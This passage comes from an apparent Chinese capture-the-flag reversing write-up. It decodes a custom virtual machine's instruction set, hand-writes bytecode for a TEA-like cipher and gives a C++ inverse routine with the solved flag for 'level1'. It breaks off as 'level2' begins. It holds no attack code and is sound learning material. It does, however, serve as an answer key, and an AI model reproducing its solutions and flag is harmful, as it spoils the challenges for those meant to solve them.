<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">code[<span class="number">8</span>] 是计数器 -&gt; i</span><br><span class="line"></span><br><span class="line">code[<span class="number">9</span>] 是flag 控制数</span><br><span class="line"></span><br><span class="line">code[<span class="number">7</span>] 是栈针</span><br><span class="line"></span><br><span class="line">code[<span class="number">6</span>] 用于实现加法</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">    </span><br><span class="line"><span class="number">0</span> code[one] = two 	++i</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = one	 ++code[<span class="number">7</span>]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = code[one]	++code[<span class="number">7</span>]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">3</span> code[code[<span class="number">7</span>] + <span class="number">10</span>] = code[<span class="number">8</span>] + <span class="number">1</span>	++code[<span class="number">7</span>]	code[<span class="number">8</span>] = one</span><br><span class="line"></span><br><span class="line"><span class="number">4</span> code[one] = code[two]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> code[<span class="number">8</span>] = one</span><br><span class="line"></span><br><span class="line"><span class="number">6</span> code[one + <span class="number">10</span> + code[<span class="number">6</span>]] += code[two] 	++i</span><br><span class="line"></span><br><span class="line"><span class="number">7</span> code[one] = code[code[<span class="number">6</span>] + <span class="number">10</span> + two]	++i</span><br><span class="line"></span><br><span class="line"><span class="number">8</span> code[one] &lt; &lt; = two	++i</span><br><span class="line"></span><br><span class="line"><span class="number">9</span> code[one] &gt; &gt; = two	++i</span><br><span class="line"></span><br><span class="line">a code[one] += code[two + <span class="number">10</span> + code[<span class="number">6</span>]]	++i</span><br><span class="line"></span><br><span class="line">b code[one] ^= code[two]	++i</span><br><span class="line"></span><br><span class="line">c <span class="keyword">if</span>( !code[<span class="number">9</span>] ) -&gt; code[<span class="number">8</span>] = one ; <span class="keyword">else</span> ++i</span><br><span class="line"></span><br><span class="line">d end</span><br><span class="line"></span><br><span class="line">e <span class="keyword">if</span>(two &lt; = code[one + <span class="number">10</span> + code[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">​	&#123;	</span><br><span class="line"></span><br><span class="line">​		<span class="keyword">if</span>(two = code[one + <span class="number">10</span> + code[<span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">​				code[<span class="number">9</span>] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">​		<span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">​				code[<span class="number">9</span>] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">​	&#125;</span><br><span class="line"></span><br><span class="line">​	<span class="keyword">else</span> -&gt; code[<span class="number">9</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">​	++i</span><br><span class="line"></span><br><span class="line">f --code[<span class="number">7</span>]	code[one] = code[code[<span class="number">7</span>] + <span class="number">10</span>] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">10</span> --code[<span class="number">7</span>]	code[<span class="number">8</span>] = code[code[<span class="number">7</span>] + <span class="number">10</span>] ++i</span><br><span class="line"></span><br><span class="line"><span class="number">11</span> code[code[<span class="number">6</span>] + <span class="number">10</span> + one] += two	++i</span><br><span class="line"></span><br><span class="line"><span class="number">12</span> code[code[<span class="number">6</span>] + <span class="number">10</span> + one] += code[code[<span class="number">6</span>] + <span class="number">10</span> + two]   ++i</span><br><span class="line"></span><br><span class="line"><span class="number">13</span> code[one] = cin	++i</span><br><span class="line"></span><br><span class="line"><span class="number">14</span> cout code[one]   ++i</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">	所以<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>都表示入栈，<span class="number">3</span>表示call因为改变了计数器；f，<span class="number">10</span>表示出栈，<span class="number">10</span>表示<span class="keyword">return</span>；</span><br></pre></td></tr></table></figure>

<p> 由此对照机械码手撸汇编：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//赋初值</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span>	<span class="number">6</span> <span class="number">32</span>			mov reg6, <span class="number">50</span>			</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">11223344</span>		push <span class="number">11223344</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">22334455</span>		push <span class="number">22334455</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">33445566</span>		push <span class="number">33445566</span>h</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">44556677</span>		push <span class="number">44556677</span>h</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//循环输入</span></span><br><span class="line"></span><br><span class="line"><span class="number">11</span>	<span class="number">0</span> <span class="number">0</span>				add reg60, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">tag1:</span><br><span class="line"></span><br><span class="line"><span class="number">13</span>	<span class="number">0</span>				mov reg0, cin</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>	<span class="number">0</span>				push [reg0]</span><br><span class="line"></span><br><span class="line"><span class="number">11</span>	<span class="number">0</span> <span class="number">1</span>				add reg60, <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e	<span class="number">0</span> <span class="number">4</span>				cmp reg60, <span class="number">4</span>	</span><br><span class="line"></span><br><span class="line">c	<span class="number">43</span>				jnz	tag1</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用cry以及输出</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>	<span class="number">4</span>E				call cry</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">0</span>				mov cout, reg0</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">1</span>				mov cout, reg1</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">2</span>				mov cout, reg2</span><br><span class="line"></span><br><span class="line"><span class="number">14</span>	<span class="number">3</span>				mov cout, reg3</span><br><span class="line"></span><br><span class="line">d						retn</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="comment">//cry实现</span></span><br><span class="line"></span><br><span class="line">cry:</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>	<span class="number">9E3779</span><span class="function">B9		push	<span class="title">delta</span>	<span class="params">(push后code[<span class="number">7</span>] = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">// v[4]</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	0 E				mov 	reg0, [esp + 6]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	1 F				mov 	reg1, [esp + 5]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	2 10			mov 	reg2, [esp + 4]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">4	3 11			mov 	reg3, [esp + 3]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">//循环</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0	3C 0				mov reg60, 0	</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">11	0 0					add reg60, 0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">tag2:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//sum</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">1</span> <span class="number">13</span>				add reg61, [esp + <span class="number">2</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">1</span>				mov reg62, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> A					add reg62, [esp + a]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">1</span>				mov reg63, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">1</span>				mov reg64, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> B					add reg64, [esp + <span class="number">9</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">0</span>					add reg62, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">0</span> <span class="number">3</span>E				mov reg0,  reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">0</span>				mov reg62, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> C					add reg62, [esp + <span class="number">8</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">0</span>				mov reg63, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">0</span>				mov reg64, reg0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> D					add reg64, [esp + <span class="number">7</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">1</span>					add reg62, reg1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">1</span> <span class="number">3</span>E				mov reg1 reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">3</span>				mov reg62, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> A					add reg62, [esp + a]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">3</span>				mov reg63, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">3</span>				mov reg64, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> B					add reg64, [esp + <span class="number">9</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">2</span>					add reg62, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">2</span> <span class="number">3</span>E				mov reg2 reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">//v3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span>E <span class="number">2</span>				mov reg62, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">8</span>	<span class="number">3</span>E <span class="number">4</span>				shl reg62, <span class="number">4</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> C					add reg62, [esp + <span class="number">8</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3F</span> <span class="number">2</span>				mov reg63, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">3</span> <span class="number">3</span>D				add reg63, reg61</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">40</span> <span class="number">2</span>				mov reg64, reg2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">9</span>	<span class="number">40</span> <span class="number">5</span>				shr reg64, <span class="number">5</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">4</span> D					add reg64, [esp + <span class="number">7</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">3F</span>				xor reg62, reg63</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">b	<span class="number">3</span>E <span class="number">40</span>				xor reg62, reg64</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">6</span>	<span class="number">2</span> <span class="number">3</span>					add reg62, reg3</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">4</span>	<span class="number">3</span> <span class="number">3</span>E				mov reg3,  reg62</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">11</span>	<span class="number">0</span> <span class="number">1</span>					add reg60, <span class="number">1</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">e	<span class="number">0</span> <span class="number">20</span>				cmp reg60, <span class="number">32</span>			</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">c	<span class="number">55</span>					jnz	tag2</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">f	<span class="number">13</span>					pop delta</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="number">10</span>						retn</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">---</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>

<p>没实现栈平衡，不过芜锁胃；反正最后return回去输出就行；</p>
<p>注意：写二进制文件时用小端序，而且以DWORD为基本单位，并以3个DWORD对齐，比如 <code>c 55</code> 写成：<code>0c 00 00 00 55 00 00 00 00 00 00 00</code> ;</p>
<p>还有个问题，根据调试，每次第一条指令开始是code[8] = 3C; 所以二进制文件需要填充垃圾信息，填多少？第一幅图中instru = code[3 * code[8] + 1010], 所以 括号里的内容为 ： 1190 ；而写二进制文件需要以DWORD为单位，所以需要填充 1190 * 4 个 00 ；</p>
<p>通过：</p>
<p><img src="https://s2.loli.net/2022/10/31/p5qd2NZMrHelwa3.png" alt="pass"></p>
<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>ida：</p>
<p><img src="https://s2.loli.net/2022/11/01/X83ejBp4Tx6KRGE.png" alt="main"></p>
<p>调试可以发现main挂不上，然后就发现旁边的函数长得和main都差不多，一个一个断点试，找到第三个是真正的main函数；</p>
<p>主要思路就是输入15个内容，进行异或和加运算，然后和v4开始的数据比较；</p>
<p>写出逆运算：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> buf[<span class="number">15</span>] = &#123;</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x46</span>, <span class="number">0x81</span>, <span class="number">0x63</span>, <span class="number">0x14</span>, <span class="number">0x53</span>, <span class="number">0x17</span>, <span class="number">0x6D</span>, <span class="number">0x6A</span>, <span class="number">0x67</span>, <span class="number">0x76</span>, <span class="number">0x16</span>, <span class="number">0x34</span>, <span class="number">0x14</span>, <span class="number">0x34</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">int</span> v0 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> ans[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">14</span>; ++i)	<span class="comment">//自加v0到加密完状态</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">2</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            v0++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v0--;		<span class="comment">//多加一个减掉</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">14</span>; i &gt;= <span class="number">0</span>; --i)		<span class="comment">//逆</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">2</span>; j &gt;= <span class="number">0</span>;--j)</span><br><span class="line">        &#123;</span><br><span class="line">            buf[i] -= v0--;</span><br><span class="line">            buf[i] ^= i ^ j ^ <span class="number">0x32</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ans[i] = buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    ans[<span class="number">15</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag：<strong>SYC{0h_y0u1_finD0V0}</strong></p>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>ida：</p>
<p><img src="https://s2.loli.net/2022/11/01/sXh8FmTYcDK6bUw.png" alt="main"></p>
<p>进去之后第一感觉会发现main是个scanf函数，但是点进去之后会发现这个东西，让调试才能查看代码；点进这个函数之后会发现是个线程创建，注意调试时改变if判断的变量值为1；</p>
<p>在线程中可以发现以下代码：</p>
<p><img src="https://s2.loli.net/2022/11/01/fKCjik9e7dcswoZ.png" alt="thread"></p>
<p>在thread main 函数里有两个函数：check() 和 encrypt() ；</p>
<p>check一开始就执行，判断长度，以及输入的内容必须为数字；</p>
<p>encrypt读入key和输入的数据，将数据前12位与key加密运算；</p>
<p>最后比较数据；</p>
<p>写出encrypt的逆向算法：</p>
